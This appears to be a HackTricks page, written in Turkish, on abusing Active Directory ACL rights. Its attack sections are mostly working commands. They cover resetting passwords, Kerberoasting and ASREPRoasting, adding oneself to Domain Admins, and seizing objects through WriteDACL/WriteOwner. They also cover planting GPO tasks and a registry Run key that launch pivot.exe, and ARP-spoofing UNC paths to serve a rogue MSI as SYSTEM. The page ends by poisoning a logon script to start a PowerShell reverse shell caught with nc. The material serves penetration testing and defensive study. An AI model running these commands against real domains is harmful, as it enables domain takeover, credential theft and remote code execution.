# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa çoğunlukla şu tekniklerin bir özetidir:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Daha fazla ayrıntı için orijinal makaleleri kontrol edin.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Bu ayrıcalık, bir saldırgana hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `Get-ObjectAcl` komutunu kullanarak `GenericAll` rights doğrulandıktan sonra, bir saldırgan şunları yapabilir:

- **Change the Target's Password**: `net user <username> <password> /domain` kullanarak, saldırgan kullanıcının şifresini sıfırlayabilir.
- Linux'tan, Samba `net rpc` ile SAMR üzerinden aynı işlemi yapabilirsiniz:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Hesap devre dışıysa, UAC bayrağını temizleyin**: `GenericAll`, `userAccountControl` üzerinde düzenleme yapılmasına izin verir. Linux'tan BloodyAD, `ACCOUNTDISABLE` bayrağını kaldırabilir:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Bir SPN’yi kullanıcının hesabına atayın ki kerberoastable olsun, ardından ticket-granting ticket (TGT) hash’lerini çıkarmak ve kırmayı denemek için Rubeus ve targetedKerberoast.py kullanın.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakın, böylece hesapları ASREPRoasting'e karşı savunmasız hale gelir.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Bir kullanıcı üzerinde `GenericAll` ile, parolasını değiştirmeden ona karşı sertifika tabanlı bir credential ekleyebilir ve onun kimliğiyle authenticate olabilirsiniz. Şuna bakın:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group Üzerinde GenericAll Rights**

Bu privilege, bir saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` rights sahibi olması durumunda group memberships’i manipüle etmesine izin verir. `Get-NetGroup` ile grubun distinguished name bilgisini belirledikten sonra, saldırgan şunları yapabilir:

- **Kendini Domain Admins Group’una Eklemek**: Bu, doğrudan komutlarla veya Active Directory ya da PowerSploit gibi modules kullanılarak yapılabilir.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux'tan ayrıca, üzerlerinde GenericAll/Write membership tuttuğunuzda kendinizi arbitrary groups içine eklemek için BloodyAD kullanabilirsiniz. Hedef group “Remote Management Users” içine nested ise, bu group'u dikkate alan hostlarda hemen WinRM access elde edersiniz:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bir computer object veya user account üzerinde bu ayrıcalıklara sahip olmak şunları sağlar:

- **Kerberos Resource-based Constrained Delegation**: Bir computer object’in kontrolünü ele geçirmeyi sağlar.
- **Shadow Credentials**: Shadow credentials oluşturma ayrıcalıklarını istismar ederek bir computer veya user account’u taklit etmek için bu tekniği kullanın.

## **WriteProperty on Group**

Bir user, belirli bir group için tüm object’ler üzerinde `WriteProperty` haklarına sahipse (ör. `Domain Admins`), şunları yapabilir:

- **Kendini Domain Admins Group’una Ekleme**: `net user` ve `Add-NetGroupUser` komutlarını birlikte kullanarak elde edilebilir; bu yöntem domain içinde privilege escalation sağlar.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Group Üzerinde Self (Self-Membership)**

Bu ayrıcalık, saldırganların grup üyeliğini doğrudan manipüle eden komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemesini sağlar. Aşağıdaki komut dizisi self-addition yapmaya izin verir:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Benzer bir yetki, saldırganların bu gruplar üzerinde `WriteProperty` hakkına sahip olmaları durumunda grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine izin verir. Bu yetkinin doğrulanması ve uygulanması şu şekilde yapılır:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Bir kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` yetkisine sahip olmak, mevcut parolayı bilmeden parola sıfırlamaya izin verir. Bu yetkinin doğrulanması ve istismar edilmesi PowerShell veya alternatif komut satırı araçlarıyla yapılabilir; etkileşimli oturumlar ve etkileşimsiz ortamlar için one-liner'lar dahil olmak üzere bir kullanıcının parolasını sıfırlamak için birkaç yöntem sunar. Komutlar, basit PowerShell çağrılarından Linux üzerinde `rpcclient` kullanmaya kadar uzanır ve saldırı vektörlerinin çok yönlülüğünü gösterir.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group Üzerinde WriteOwner**

Bir saldırgan, bir grup üzerinde `WriteOwner` yetkilerine sahip olduğunu tespit ederse, grubun sahipliğini kendisine değiştirebilir. Bu durum özellikle söz konusu grup `Domain Admins` ise çok etkilidir; çünkü sahipliği değiştirmek, grup öznitelikleri ve üyeliği üzerinde daha geniş kontrol sağlar. Süreç, `Get-ObjectAcl` ile doğru nesneyi belirlemeyi ve ardından sahibi, SID ya da isim yoluyla değiştirmek için `Set-DomainObjectOwner` kullanmayı içerir.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **User üzerinde GenericWrite**

Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine izin verir. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının logon script path değerini, kullanıcı oturum açtığında kötü amaçlı bir script çalıştıracak şekilde değiştirebilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın scriptine işaret edecek biçimde güncellemek için `Set-ADObject` komutunu kullanarak gerçekleştirilir.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **Group Üzerinde GenericWrite**

Bu ayrıcalıkla saldırganlar grup üyeliğini manipüle edebilir, örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilir. Bu süreç, bir credential object oluşturmayı, bunu bir gruba kullanıcı eklemek veya gruptan çıkarmak için kullanmayı ve membership değişikliklerini PowerShell komutlarıyla doğrulamayı içerir.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux’tan, Samba `net`, grup üzerinde `GenericWrite` yetkiniz varsa üyeleri ekleyip kaldırabilir (PowerShell/RSAT kullanılamadığında faydalıdır):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, bir saldırganın kendisine nesne üzerinde `GenericAll` ayrıcalıkları vermesini sağlar. Bu, ADSI manipülasyonu ile gerçekleştirilir ve nesne üzerinde tam kontrol ile grup üyeliklerini değiştirme yeteneği sağlar. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlets kullanılarak bu ayrıcalıkları istismar etmeye çalışırken sınırlamalar vardır.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Bir user veya service account üzerinde `WriteOwner` ve `WriteDacl` yetkiniz varsa, tam kontrolü ele geçirebilir ve eski parolayı bilmeden PowerView kullanarak parolasını sıfırlayabilirsiniz:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notlar:
- Yalnızca `WriteOwner` yetkiniz varsa, önce owner'ı kendinize değiştirmeniz gerekebilir:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Parolayı sıfırladıktan sonra herhangi bir protokolle (SMB/LDAP/RDP/WinRM) erişimi doğrula.

## **Domain Üzerinde Replikasyon (DCSync)**

DCSync attack, Domain Controller’ı taklit etmek ve kullanıcı credentials dahil verileri synchronize etmek için domain üzerindeki belirli replication permissions'ı kullanır. Bu güçlü teknik, `DS-Replication-Get-Changes` gibi permissions gerektirir ve attacker’ların Domain Controller’a doğrudan erişim olmadan AD ortamından sensitive information çıkarmasını sağlar. [**DCSync attack hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) yönetimi için delegated access ciddi security riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir user’a GPO management rights delegate edilirse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi privileges’a sahip olabilir. Bu permissions, PowerView kullanılarak tespit edildiği gibi kötü amaçlı amaçlarla abused edilebilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Yanlış yapılandırılmış GPO’ları identify etmek için PowerSploit cmdlet’leri zincirlenebilir. Bu, belirli bir user’ın manage etme permissions’ına sahip olduğu GPO’ların discover edilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Policy Uygulanmış Computer’lar**: Belirli bir GPO’nun hangi computer’lara uygulandığını resolve etmek mümkündür; bu da potansiyel impact kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Computer’a Uygulanan Policy’ler**: Belirli bir computer’a hangi policy’lerin uygulandığını görmek için `Get-DomainGPO` gibi commands kullanılabilir.

**Belirli Bir Policy Uygulanmış OU’lar**: Belirli bir policy’den etkilenen organizational unit (OU)’leri identify etmek için `Get-DomainOU` kullanılabilir.

Ayrıca GPO’ları enumerate etmek ve içlerindeki issues’ları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) tool’unu da kullanabilirsiniz.

### Abuse GPO - New-GPOImmediateTask

Yanlış yapılandırılmış GPO’lar, örneğin immediate scheduled task oluşturarak code execute etmek için abused edilebilir. Bu, etkilenen makinelerde bir user’ı local administrators grubuna eklemek ve böylece privileges’ı önemli ölçüde yükseltmek için yapılabilir:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy modülü, yüklüyse, yeni GPO’ların oluşturulmasına ve bağlanmasına, ayrıca etkilenen bilgisayarlarda backdoor’ları çalıştırmak için registry değerleri gibi preferences ayarlanmasına izin verir. Bu yöntem, execution için GPO’nun güncellenmesini ve bir kullanıcının bilgisayara log in olmasını gerektirir:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO'yu Abuse Et

SharpGPOAbuse, yeni GPO'lar oluşturma ihtiyacı olmadan görevler ekleyerek veya ayarları değiştirerek mevcut GPO'ları abuse etmek için bir yöntem sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO güncellemeleri genellikle yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak için, özellikle bir değişiklik uyguladıktan sonra, hedef bilgisayarda `gpupdate /force` komutu kullanılarak anında bir policy güncellemesi zorlanabilir. Bu komut, GPO'larda yapılan herhangi bir değişikliğin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### Under the Hood

Belirli bir GPO için Scheduled Tasks incelendiğinde, örneğin `Misconfigured Policy`, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya yetkileri yükseltmeyi amaçlayan script'ler ya da command-line tools aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından üretilen XML configuration file'da gösterildiği gibi task'ın yapısı, çalıştırılacak command ve trigger'ları dahil olmak üzere scheduled task'ın ayrıntılarını ortaya koyar. Bu file, scheduled task'lerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini gösterir; policy enforcement kapsamında keyfi commands veya script'ler çalıştırmak için bir yöntem sunar.

### Users and Groups

GPO'lar, target systems üzerindeki user ve group üyeliklerinin manipulation edilmesine de izin verir. Users and Groups policy file'ları doğrudan düzenlenerek, attackers yerel `administrators` group'u gibi ayrıcalıklı gruplara user ekleyebilir. Bu, GPO management permissions delegation sayesinde mümkündür; bu da policy file'larının yeni user'lar ekleyecek veya group üyeliklerini değiştirecek şekilde modifiye edilmesine izin verir.

Users and Groups için XML configuration file, bu değişikliklerin nasıl uygulandığını açıklar. Bu file'a entries ekleyerek, belirli user'lara etkilenen systems genelinde elevated privileges verilebilir. Bu yöntem, GPO manipulation yoluyla privilege escalation için doğrudan bir yaklaşım sunar.

Ayrıca, code çalıştırmak veya persistence sağlamak için logon/logoff script'lerinden yararlanmak, autoruns için registry keys'leri değiştirmek, .msi file'ları üzerinden software kurmak ya da service configurations düzenlemek gibi ek yöntemler de değerlendirilebilir. Bu techniques, GPO'ların abuse edilmesi yoluyla access'i sürdürmek ve target systems'i kontrol etmek için çeşitli yollar sağlar.

### WriteGPLink + UNC path hijacking (ARP spoofing)

Bir OU/domain üzerinde `WriteGPLink`, target container'ın `gPLink` attribute'unu değiştirmenize ve GPO'nun kendisini düzenlemeden **mevcut bir GPO'yu zorla uygulamanıza** izin verir. Bu, bağlı GPO zaten **UNC paths** (`\\HOST\share\...`) üzerinden remote content referans veriyorsa ilginç hale gelir; çünkü authenticated users **SYSVOL** okuyabilir ve yeniden kullanılabilir policy'leri offline olarak araştırabilir.

High-level workflow:

1. BloodHound kullanarak bir OU üzerinde `WriteGPLink` yetkisine sahip bir principal belirleyin ve o OU içindeki computers/users'ları enumerate edin.
2. `SYSVOL`'u read-only olarak clone edin ve **Software Installation**, **drive mappings** (`Drives.xml`) ve UNC paths referans veren **logon/startup scripts** arayan GPO'ları parse edin.
3. DFS/domain-namespace path'leri yerine **direct hostname**'e işaret eden policy'leri tercih edin (örneğin `\\DC02\share\pkg.msi`); çünkü hostname tabanlı path'leri L2 spoofing ile yönlendirmek daha kolaydır.
4. Seçilen GPO GUID'sini target OU'nun `gPLink` alanına ekleyin; böylece victim zaten var olan bu policy'yi işler.
5. Aynı broadcast domain üzerinde, UNC host'a ARP spoof yapın ve IP'sini yerel olarak bağlayın (`ip addr add <target_ip>/32 dev <iface>`); böylece victim'ın SMB traffic'i sizin host'unuza ulaşır.
6. Beklenen path/filename'i attacker SMB server'dan (örneğin `smbserver.py`) servis edin ve normal policy processing'i bekleyin.

Örnek `SYSVOL` collection ve GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Mevcut GPO’yu hedef OU’ya bağlayın:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Bağlı GPO, bir UNC path’ten bir MSI dağıtıyorsa, client bunu **computer startup** sırasında çeker ve **`NT AUTHORITY\SYSTEM`** olarak kurar. Referans verilen host’u spoof edip **aynı share/path/name** altında zararlı bir MSI sunarak, **SYSVOL** değiştirmeden **WriteGPLink**’i SYSTEM code execution’a dönüştürebilirsiniz.

Önemli kısıtlar:

- **Zamanlama önemlidir**: yeni link policy refresh’te görülür (genelde ~90 dakika), ancak **Software Installation** çoğunlukla **reboot** sırasında tetiklenir.
- Windows Installer genellikle dağıtımı package **`ProductCode`** ile takip eder. Ürün zaten kuruluysa, dağıtım atlanabilir.
- Installer rejection’ı önlemek için, rogue MSI’ı GPO’nun beklediği meşru package ile **`ProductCode`** ve **`PackageCode`** eşleşecek şekilde patch’leyin.
- Eski `.aas` advertisement dosyaları **SYSVOL** içinde kalabilir, bu yüzden buna güvenmeden önce deployment’ın hâlâ aktif göründüğünü doğrulayın.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` içindeki GPP drive mappings, kullanıcıların logon veya yeniden bağlanma sırasında yapılandırılmış UNC path’e authenticate olmasına neden olur. Referans verilen host’u spoof ederseniz, **NetNTLMv2** capture edebilirsiniz. SMB kasıtlı olarak başarısız olacak şekilde ayarlanırsa, Windows **WebDAV** üzerinden yeniden deneyebilir ve **LDAP(S)**, **AD CS** veya **SMB** relay’leri için çok daha esnek olan **HTTP üzerinden NTLM** gönderebilir.

#### Logon/startup script UNC hijack

Aynı desen, `SYSVOL` içinde bulunan UNC-hosted script’ler için de geçerlidir:

- **Logon scripts** genellikle **user** context’inde çalışır.
- **Startup scripts** genellikle **computer / SYSTEM** context’inde çalışır.

Script path spoof edilebilir bir hostname’e işaret ediyorsa, UNC host’u redirect edin ve beklenen konumdan replacement script içeriği sunun.

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` veya `\\<dc>\NETLOGON\` altındaki yazılabilir path’ler, GPO aracılığıyla user logon sırasında çalıştırılan logon script’lerin değiştirilmesine izin verir. Bu, oturum açan kullanıcıların security context’inde code execution sağlar.

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Domain paylaşımlarını tarayarak kısayolları veya scriptlere referansları ortaya çıkarın:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- SYSVOL/NETLOGON içine işaret eden hedefleri çözümlemek için `.lnk` dosyalarını ayrıştırın (DFIR için yararlı bir trick ve doğrudan GPO erişimi olmayan attackers için):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound, mevcut olduğunda kullanıcı düğümlerinde `logonScript` (scriptPath) özniteliğini gösterir.

### Write access doğrulaması yapın (share listings’e güvenmeyin)
Otomatik araçlar SYSVOL/NETLOGON’u salt okunur gösterebilir, ancak alttaki NTFS ACL’leri yine de yazmaya izin verebilir. Her zaman test edin:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
### RCE için bir VBScript logon script'ini poison et
İşlevi bozmamak için orijinal mantığı koruyarak PowerShell reverse shell (revshells.com'dan generate edin) başlatan bir komut ekleyin:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Ana makinede dinlemede kalın ve bir sonraki etkileşimli oturumu bekleyin:
```bash
rlwrap -cAr nc -lnvp 443
```
Notlar:
- Execution, logging kullanıcısının token’ı altında gerçekleşir (SYSTEM değil). Kapsam, bu script’i uygulayan GPO link’idir (OU, site, domain).
- Orijinal içeriği/timestamp’leri kullanımdan sonra geri yükleyerek cleanup yapın.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
